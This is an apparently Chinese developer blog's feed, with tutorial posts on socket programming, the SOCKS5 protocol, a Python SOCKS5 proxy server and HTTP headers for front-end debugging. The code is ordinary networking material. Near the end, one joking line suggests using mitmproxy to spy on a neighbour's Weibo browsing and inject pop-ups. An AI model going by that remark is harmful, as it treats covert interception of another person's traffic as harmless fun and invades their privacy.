addr_type == <span class="number">1</span>:</span><br><span class="line">        addr_ip = sock.recv(<span class="number">4</span>)</span><br><span class="line">        remote_addr = socket.inet_ntoa(addr_ip)</span><br><span class="line">    <span class="keyword">elif</span> addr_type == <span class="number">3</span>:</span><br><span class="line">        addr_len = int.from_bytes(sock.recv(<span class="number">1</span>), byteorder=<span class="string">'big'</span>)</span><br><span class="line">        remote_addr = sock.recv(addr_len)</span><br><span class="line">    <span class="keyword">elif</span> addr_type == <span class="number">4</span>:</span><br><span class="line">        addr_ip = sock.recv(<span class="number">16</span>)</span><br><span class="line">        remote_addr = socket.inet_ntop(socket.AF_INET6, addr_ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># DST.PORT</span></span><br><span class="line">    remote_addr_port = struct.unpack(<span class="string">'&gt;H'</span>, sock.recv(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回给客户端 success</span></span><br><span class="line">    reply = <span class="string">b"\x05\x00\x00\x01"</span></span><br><span class="line">    reply += socket.inet_aton(<span class="string">'0.0.0.0'</span>) + struct.pack(<span class="string">"&gt;H"</span>, <span class="number">8888</span>)</span><br><span class="line">    sock.send(reply)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拿到 remote address 的信息后，建立连接</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        remote = socket.create_connection((remote_addr, remote_addr_port[<span class="number">0</span>]))</span><br><span class="line">        logging.info(<span class="string">'connecting %s:%d'</span> % (remote_addr, remote_addr_port[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(e)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    handle_tcp(sock, remote)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    socketServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    socketServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    socketServer.bind((<span class="string">''</span>, <span class="number">8888</span>))</span><br><span class="line">    socketServer.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            sock, addr = socketServer.accept()</span><br><span class="line">            t = threading.Thread(target=handle_con, args=(sock, addr))</span><br><span class="line">            t.start()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        logging.error(e)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        socketServer.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>首先，上面只是个 socks5 服务器的简单实现，处理 TCP 的转发，无需密码认证。</p><p>接下来我们分开来看，主要是三个部分 <code>main()</code>, <code>handle_con()</code>, <code>handle_tcp()</code> </p><ul><li><code>main()</code> 函数大家其实挺熟悉的，就是前面教程介绍的 socket 编程的线程方法，绑定套接字监听，然后有客户端请求后，调用 <code>handle_con()</code></li><li><code>handle_con</code> 实现了 socks5 的 认证和连接过程，大家对照下注释和前面的 socks5 协议，应该挺容易看懂。</li><li>认证完成后，就开始转发请求了， <code>handle_tcp()</code> 实现了这个功能，这里面用到了 <code>select</code> ，IO 多路复用模式。其实一开始怕大家不理解，也想用线程来实现，不过发现 IO 多路复用在一个线程中就能监听多个套接字，代码比多线程方式更加简洁，索性就这么用了。这里面没有根据平台去判断用 select, poll 还是 epoll，感兴趣的话可以直接看 shadowsocks 的实现 <a href="https://github.com/shadowsocks/shadowsocks/blob/master/shadowsocks/eventloop.py" target="_blank" rel="noopener">eventloop</a></li></ul><p>下篇我们看看 socks5 服务器如何和 client 端交互。</p><p>参考链接：</p><pre><code>* https://github.com/felix021/ssocks5/blob/master/ssocks5.py* https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接下来我们用 python 写下 socks5 服务端的实现&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(3) -socks5 代理</title>
    <link href="http://yousite.com/2017/08/19/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-3-socks5-%E4%BB%A3%E7%90%86/"/>
    <id>http://yousite.com/2017/08/19/由浅入深写代理-3-socks5-代理/</id>
    <published>2017-08-19T07:34:32.000Z</published>
    <updated>2018-01-27T14:59:43.600Z</updated>
    
    <content type="html"><![CDATA[<p>本文讲的是如何写一个 socks5 代理，其实 shadowsocks 的代理也是 socks5 协议的，所以 socks5 代理也是本系列教程的一个重点。</p><p>首先放出 socks5 协议的 <a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="noopener">rfc</a>，socks5 协议很简单，SOCKS5 协议并不负责代理服务器的数据传输环节，此协议只是在 C/S 两端真实交互之间，建立起一条从客户端到代理服务器的授信连接。<br><a id="more"></a></p><h3 id="sock5-代理结构图"><a href="#sock5-代理结构图" class="headerlink" title="sock5 代理结构图"></a>sock5 代理结构图</h3><p><img src="/media/15032089114950.jpg" alt=""></p><h3 id="0x02-socks5-协议分析"><a href="#0x02-socks5-协议分析" class="headerlink" title="0x02 socks5 协议分析"></a>0x02 socks5 协议分析</h3><h5 id="认证阶段"><a href="#认证阶段" class="headerlink" title="认证阶段"></a>认证阶段</h5><p>首先客户端需要和服务端有个握手认证的过程，可以采用 <strong>用户名/密码</strong> 认证或者无需认证方式。</p><p>格式如下 （<em>数字表示位数</em>）</p><pre><code>+----+----------+----------+|VER | NMETHODS | METHODS  |+----+----------+----------+| 1  |    1     |  1~255   |+----+----------+----------+</code></pre><ul><li>VER 字段是当前协议的版本号，也就是 5；</li><li>NMETHODS 字段是 METHODS 字段占用的字节数；</li><li><p>METHODS 字段的每一个字节表示一种认证方式，表示客户端支持的全部认证方式。</p><pre><code>0x00: NO AUTHENTICATION REQUIRED0x01: GSSAPI0x02: USERNAME/PASSWORD0x03: to X’7F’ IANA ASSIGNED0x80: to X’FE’ RESERVED FOR PRIVATE METHODS0xFF: NO ACCEPTABLE METHODS</code></pre></li></ul><p>服务端返回格式</p><pre><code>+----+--------+|VER | METHOD |+----+--------+| 1  |   1    |+----+--------+</code></pre><p>一般情况下服务端返回两种情况</p><pre><code>0x05 0x00：告诉客户端采用无认证的方式建立连接；0x05 0xff：客户端的任意一种认证方式服务器都不支持。</code></pre><p>举个例子， 服务器无需认证的情况如下</p><pre><code>client -&gt; server: 0x05 0x01 0x00server -&gt; client: 0x05 0x00</code></pre><h5 id="连接阶段"><a href="#连接阶段" class="headerlink" title="连接阶段"></a>连接阶段</h5><p>认证完成，客户端向服务端发送请求：</p><pre><code>+----+-----+-------+------+----------+----------+|VER | CMD |  RSV  | ATYP | DST.ADDR | DST.PORT |+----+-----+-------+------+----------+----------+| 1  |  1  |   1   |  1   | Variable |    2     |+----+-----+-------+------+----------+----------+</code></pre><ul><li>CMD 字段 command 的缩写：<ul><li>0x01：CONNECT 建立 TCP 连接</li><li>0x02: BIND 上报反向连接地址</li><li>0x03：关联 UDP 请求</li></ul></li><li>RSV 字段：保留字段，值为 0x00</li><li>ATYP 字段：address type 的缩写，取值为：<ul><li>0x01：IPv4        </li><li>0x03：域名</li><li>0x04：IPv6</li></ul></li><li>DST.ADDR 字段：destination address 的缩写，取值随 ATYP 变化：<ul><li>ATYP == 0x01：4 个字节的 IPv4 地址</li><li>ATYP == 0x03：1 个字节表示域名长度，紧随其后的是对应的域名</li><li>ATYP == 0x04：16 个字节的 IPv6 地址</li><li>DST.PORT 字段：目的服务器的端口</li></ul></li></ul><p>服务端返回格式</p><pre><code>+----+-----+-------+------+----------+----------+|VER | REP |  RSV  | ATYP | BND.ADDR | BND.PORT |+----+-----+-------+------+----------+----------+| 1  |  1  |   1   |  1   | Variable |    2     |+----+-----+-------+------+----------+----------+</code></pre><ul><li>REP 字段<ul><li>X’00’ succeeded</li><li>X’01’ general SOCKS server failure</li><li>X’02’ connection not allowed by ruleset</li><li>X’03’ Network unreachable</li><li>X’04’ Host unreachable</li><li>X’05’ Connection refused</li><li>X’06’ TTL expired</li><li>X’07’ Command not supported</li><li>X’08’ Address type not supported</li><li>X’09’ to X’FF’ unassigned</li></ul></li></ul><p>举个例子，客户端通过 127.0.0.1:8000 的代理发送请求</p><pre><code># request:        VER  CMD  RSV  ATYP DST.ADDR            DST.PORTclient -&gt; server: 0x05 0x01 0x00 0x01 0x7f 0x00 0x00 0x01 0x1f 0x40# response:       VER  REP  RSV  ATYP BND.ADDR            BND.PORTserver -&gt; client: 0x05 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x10 0x10</code></pre><h4 id="传输阶段"><a href="#传输阶段" class="headerlink" title="传输阶段"></a>传输阶段</h4><p>接下来就开始传输数据，socks5 服务器只做单纯的转发功能</p><p>整个过程如下</p><pre><code># 认证阶段client -&gt; server: 0x05 0x01 0x00server -&gt; client: 0x05 0x00# 连接阶段client -&gt; server: 0x05 0x01 0x00 0x03 0x0a b&apos;google.com&apos;  0x00 0x50server -&gt; client: 0x05 0x00 0x00 0x01 0x00 0x00 0x00 0x00 0x10 0x10# 传输阶段client -&gt; server -&gt; remoteremote -&gt; server -&gt; client...    </code></pre><p>下篇教程用代码实现下 socks5 代理</p><p>参考链接：</p><pre><code>* https://loggerhead.me/posts/shadowsocks-yuan-ma-fen-xi-xie-yi-yu-jie-gou.html#fn:bnd.addr* https://www.ietf.org/rfc/rfc1928.txt* http://www.moye.me/2017/08/03/analyze-socks5-protocol/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文讲的是如何写一个 socks5 代理，其实 shadowsocks 的代理也是 socks5 协议的，所以 socks5 代理也是本系列教程的一个重点。&lt;/p&gt;
&lt;p&gt;首先放出 socks5 协议的 &lt;a href=&quot;https://www.ietf.org/rfc/rfc1928.txt&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;rfc&lt;/a&gt;，socks5 协议很简单，SOCKS5 协议并不负责代理服务器的数据传输环节，此协议只是在 C/S 两端真实交互之间，建立起一条从客户端到代理服务器的授信连接。&lt;br&gt;
    
    </summary>
    
    
      <category term="代理" scheme="http://yousite.com/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(2)- socket 编程</title>
    <link href="http://yousite.com/2017/08/14/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-2-socket-%E7%BC%96%E7%A8%8B/"/>
    <id>http://yousite.com/2017/08/14/由浅入深写代理-2-socket-编程/</id>
    <published>2017-08-14T15:21:04.000Z</published>
    <updated>2018-01-27T14:59:49.144Z</updated>
    
    <content type="html"><![CDATA[<p>说到代理，那肯定会跟网络协议有关，包括（tcp, ip, http），网络中的进程需要通过 socket 来通信，socket 可以认为是操作系统抽象出来的一类接口，供使用者能够更加方便的与底层的网络协议打交道。<br><a id="more"></a><br>0x01<br>我们先来看看 tcp 的 socket 编程。</p><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="comment"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># 将套接字绑定到地址</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"><span class="comment"># 监听TCP传入连接</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    print(<span class="string">"new connection from %s:%s"</span> % addr)</span><br><span class="line">    sock.send(<span class="string">b'Welcome!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send(<span class="string">b'Hello, %s!'</span> % data)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=handle_tcp, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">print(s.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'dog'</span>]:</span><br><span class="line">    s.send(data)</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>上面是个很简单的客户端和服务端的例子，服务器端用了线程，主要是为了能够同时处理多个请求。不然每次处理请求的时候整个程序就会处于阻塞状态。</p><p>通过 wireshark 捕获请求，可以看到客户端经过三次握手和服务端连接成功，接下来双方开始发送数据，发送完成后，四次挥手断开连接。 </p><p><img src="/media/15029009030503.jpg" alt=""></p><p>具体说下过程吧</p><ol><li>首先服务器端初始化一个 socket 对象，将 socket 绑定到 (127.0.0.1, 8888) 这个地址上(bind)，然后开始监听(listen)，并阻塞在 accept 函数上，直到有连接过来。</li><li>客户端也初始化一个 socket 对象，调用 connect 和服务端建立连接。</li><li>服务端 accept 函数返回了一个新的 sock 套接字对象，传入到新线程中和客户端交互数据。</li><li>接下来就是 socket 的 recv 和 send 函数进行数据的交互。</li><li>最后 socket close 关闭套接字。</li></ol><p>由于 tcp 传递的数据属于 stream, 也就是调用 recv 和 send 的次数都没有限制，对数据的发送和边界也没有限制。这个和下文的 udp 编程有区别，发送端每执行一次写操作，udp 模块就会将它封装成一个 udp 包发送，接收端也对每个 udp 包执行一次读操作，每次都得完整取出来，如果没有足够的应用缓冲区来读取 udp 数据包，则会被截断。</p><p>0x02</p><p>再简单看下 udp 的 socket 编程</p><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># AF_INET: 基于 IPV4 的网络通信 SOCK_DGRAM: 基于 udp 的流式 socket 通信</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"><span class="comment"># 将套接字绑定到地址</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data, addr = s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(<span class="string">'Received from %s:%s.'</span> % addr)</span><br><span class="line">    s.sendto(<span class="string">b'Hello, %s!'</span> % data, addr)</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> [<span class="string">b'dog'</span>]:</span><br><span class="line">    s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">8888</span>))</span><br><span class="line">    print(s.recv(<span class="number">1024</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>由于 udp 不需要建立连接，只需要知道对方的 IP 地址和端口号，就可以直接发数据包。但是，能不能到达就不知道了。所以客户端直接通过 sendto() 给服务器发数据，服务端调用 recvfrom() 就能拿到数据。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说到代理，那肯定会跟网络协议有关，包括（tcp, ip, http），网络中的进程需要通过 socket 来通信，socket 可以认为是操作系统抽象出来的一类接口，供使用者能够更加方便的与底层的网络协议打交道。&lt;br&gt;
    
    </summary>
    
    
      <category term="代理" scheme="http://yousite.com/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(1)-介绍</title>
    <link href="http://yousite.com/2017/08/14/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-1-%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yousite.com/2017/08/14/由浅入深写代理-1-介绍/</id>
    <published>2017-08-14T15:16:27.000Z</published>
    <updated>2017-08-27T03:02:12.000Z</updated>
    
    <content type="html"><![CDATA[<p>代理作为现代人上网必备的一个工具，但是大家其实对其中的原理也不是特别了解，所以写了一个系列的教程，由浅入深的讲解下。</p><p>代理可以分为正向代理和反向代理。</p><ul><li>正向代理是一个位于客户端和目标服务器之间的代理服务器，用来把客户端的请求代理到目标服务器，比如科学上网。</li><li>反向代理就好像是目标服务器，客户端并不知道这个请求具体会被转发到哪里，由反向代理自己判断，比如负载均衡。</li></ul><p>这次主要教程跟正向代理有关，目前已更新如下</p><p>由浅入深写代理(2)- socket 编程<br>由浅入深写代理(3) -socks5 代理<br>由浅入深写代理(4)-socks5-代理<br>由浅入深写代理(5)-socks5-代理<br>由浅入深写代理(6)-http-代理<br>由浅入深写代理(7)-https-代理<br>由浅入深写代理(8)-ss-代理<br>由浅入深写代理(9)-ssh-代理<br>由浅入深写代理(10)-内网穿透</p><p>tips</p><ol><li>这次教程的所有资源的 github 地址为 <a href="https://github.com/facert/socket-example" target="_blank" rel="noopener">https://github.com/facert/socket-example</a><br>（除了 ss-local.py 和 ss-server.py 以外，其他都用 python3 编写）</li><li>公众号 程序化思维 , 欢迎关注</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;代理作为现代人上网必备的一个工具，但是大家其实对其中的原理也不是特别了解，所以写了一个系列的教程，由浅入深的讲解下。&lt;/p&gt;
&lt;p&gt;代理可以分为正向代理和反向代理。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;正向代理是一个位于客户端和目标服务器之间的代理服务器，用来把客户端的请求代理到目标
      
    
    </summary>
    
    
      <category term="代理" scheme="http://yousite.com/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>写给前端的甩锅指南</title>
    <link href="http://yousite.com/2017/03/08/%E5%86%99%E7%BB%99%E5%89%8D%E7%AB%AF%E7%9A%84%E7%94%A9%E9%94%85%E6%8C%87%E5%8D%97/"/>
    <id>http://yousite.com/2017/03/08/写给前端的甩锅指南/</id>
    <published>2017-03-08T08:04:53.000Z</published>
    <updated>2017-03-08T14:32:00.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">前端小白，“老王，你的接口不能用了”</span><br><span class="line">后端老王一脸不屑，“怎么可能，刚刚还能用，你看看参数传对了没有。” </span><br><span class="line">前端小白吭哧吭哧检查了几遍，“参数没问题啊，你看看是不是有 username, id。。。”</span><br><span class="line">后端老王顿了许久， “参数应该没问题，你再清下浏览器缓存试试”</span><br><span class="line">前端小白摁着 &quot;ctr + f5&quot; 刷新了好多次， 一脸苦逼的说：“清完浏览器缓存了，还是有问题”</span><br><span class="line">后端老王略过一丝疑虑，难道是我接口出问题了，不该啊，刚还能用，都测试好几遍了，说道：“你看看是不是数据库存的测试数据有问题，删了再试试，或者换个浏览器，重启下 server。”</span><br><span class="line">前端小白照着老王的方法逐一尝试着。。。</span><br><span class="line">突然老王拍了下脑瓜，一脸尴尬的说：“小白，我刚 fix 一个线上 bug, 测试环境换了分支，所以接口出问题了。”</span><br><span class="line">小白一脸生无可恋的望着老王头顶的地中海发呆。。。</span><br></pre></td></tr></table></figure><p>上面情节纯属虚构，作为一个后端开发人员，我怎么忍心这么黑自己的同行呢 😭。不过思考下这么一个问题，前端如何能够快速的定位问题呢。这里面跟很多因素有关，比如前后端协作流程是否完善，前后端人员的经验。<br><a id="more"></a></p><p>我经常看见前端工程师的招聘贴上会有这么一个要求：了解一门后台语言，有后台开发经验者优先。很多人可能心里嘀咕：这是准备拿我当全栈去用啊。先不说这个算不算全栈，就说这个要求具体指什么。其实它指的是对于 web 开发流程的熟悉，你需要理解一个 ajax post 请求最后如何变成一条数据库记录的。流程其实很复杂，本文就说一个重点，前后端信息交互的信使，http 请求。</p><p>说到这，很多朋友觉得没意思，后端的同学会说不就是处理个请求吗，写个方法，拿到数据，存个数据库，返回个 success ，完事。前端的也说 ajax 我用的可溜了，post 一下，拿到后端返回的 success，弹个窗，皆大欢喜。</p><p>好吧，其实确实是这个道理。但如果不 success 了，怎么能够知道问题在哪。我相信大家对下面那张图都很熟悉，chrome 的 devtool ，一般情况下大家在这里看请求传递的参数，返回的结果。但是很多人都会忽略一些默认传递的 headers，比如 cookie，content-type</p><p><img src="/media/QQ20170308-1.png" alt="QQ20170308-1"></p><p>举个 csrf_token 的例子，经常有一些刚入门的前端会遇到这么个情况，页面上 form 表单 post 提交好好的。但是一旦换成 ajax 请求发现怎么就返回 403 了呢，搜了下最大工单系统 stackoverflow，一下子就有解决方案了，至于为什么，就没有去深入探究了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function csrfSafeMethod(method) &#123;</span><br><span class="line">    // these HTTP methods do not require CSRF protection</span><br><span class="line">    return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));</span><br><span class="line">&#125;</span><br><span class="line">$.ajaxSetup(&#123;</span><br><span class="line">    beforeSend: function(xhr, settings) &#123;</span><br><span class="line">        if (!csrfSafeMethod(settings.type) &amp;&amp; !this.crossDomain) &#123;</span><br><span class="line">            xhr.setRequestHeader(&quot;X-CSRFToken&quot;, csrftoken);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>入正题，对于一个前端来说，了解下 http 协议很有用。只有你了解发出去的包是什么，你才会有这个胆量说这个锅前端不背，浏览器也不背。</p><p>http 协议基于 tcp 协议之上，所以 tcp 将一些粗活累活都揽在自己手里了，比如分片，重试，连接。http 只需要将规定好的格式传给接收方就行了。</p><p>比如这个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6) Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><p>由于 http 经过这么多年的发展，加的东西也是越来越多，权威指南越来越厚。基本上活到老学到老，但是添加新东西总有他的道理，如果我们能够添加的那些东西都解决了什么问题，其实比死记硬背效果更好。我们往下看</p><p>首先是交互的方法，最基本的方法有4种，分别是POST, GET, PUT，DELETE 。后端工程师平时工作有很大的部分就是做 CRUD，跟这些方法较劲。每个方法的出现都有它的作用，比如 HEAD，大家只是想知道 <a href="https://zhihu.com" target="_blank" rel="noopener">https://zhihu.com</a> 这个 url 对应的 http 头部里面有啥信息，用 GET 做请求把所有页面信息都返回了，太不经济，所以就有了 HEAD 这个方法。当然你也可以自己创造一个方法，比如 ‘FUCK’, 需要后端写个相应的方法支持。<br><img src="/media/QQ20170308-2.png" alt="QQ20170308-2"></p><p><a href="https://gist.github.com/facert/c24f1ecf8a09d9ab43215e452d4e5ac7" target="_blank" rel="noopener">server端代码</a></p><p>其实 http 里面最难理解的就是各种头，如果要一个个去记住实在太难，但是其实他们也是为了解决各种问题的。比如为了缓存页面，有 cache-control，If-Match, If-None-Match, If-Modified-Since, ETag。可以参考这篇： <a href="http://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="noopener">HTTP缓存控制小结</a></p><p>网站总会遇到一些安全问题，比如 xss, csrf 之类。开发人员很难保证写出来的程序没有漏洞，浏览器加了些安全策略来防御 xss，同样的，加一些 http 的头也能有效的防御攻击，比如 csp(Content Security Policy)， 参考文章： <a href="https://imququ.com/post/content-security-policy-reference.html" target="_blank" rel="noopener">Content Security Policy 介绍</a></p><p>还比如说 Cookie 这个头，它本身的值就有很多选项，控制 Cookie 的作用范围，失效时间。浏览器是默认传 Cookie 的，但是如果不在浏览器上，写爬虫脚本的话需要自己把 Cookie 这个 header 带上。很多的 web server 是借助 Cookie 作为用户会话的凭证的，比如存一个唯一的 sessionid 值到 Cookie，每次请求都带上，来判断是哪个用户。</p><p>另外如果不用 Cookie 作为会话认证，还有其他方式吗？其实说到底认证就是需要传给服务端有个字段标识哪个用户，那我们可以在头里面加个 Authorization 的字段，其他名字也行，只要跟服务端商量好。</p><p>还有一种情况，如果你请求的接口和你当前的域不一样，叫跨域请求，几种解决方案，其中一种是服务端加 Access-Control-Allow-Origin 头，其实就是浏览器看见了这种头，就给了权限访问其他域。<br>最后 http 会有一些状态码返回，<a href="http://www.ttlsa.com/web/http-response-code-list/" target="_blank" rel="noopener">状态码对应表</a>，状态码也可以自定义，比如定义个 233。</p><p><img src="/media/QQ20170308-3.png" alt="QQ20170308-3"></p><p>如果你写的是手机端的混合页面，没有 dev_tool 调试很心塞，这个时候你可以用 charles 或者 mitmproxy 做代理。mitmproxy 作为中间人劫持工具，还能满足你的好奇心，比如看看隔壁妹子在刷什么微博，给她弹个窗什么的。</p><p>所以问题来了，最终锅甩给谁了呢？</p>]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;前端小白，“老王，你的接口不能用了”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;后端老王一脸不屑，“怎么可能，刚刚还能用，你看看参数传对了没有。” &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;前端小白吭哧吭哧检查了几遍，“参数没问题啊，你看看是不是有 username, id。。。”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;后端老王顿了许久， “参数应该没问题，你再清下浏览器缓存试试”&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;前端小白摁着 &amp;quot;ctr + f5&amp;quot; 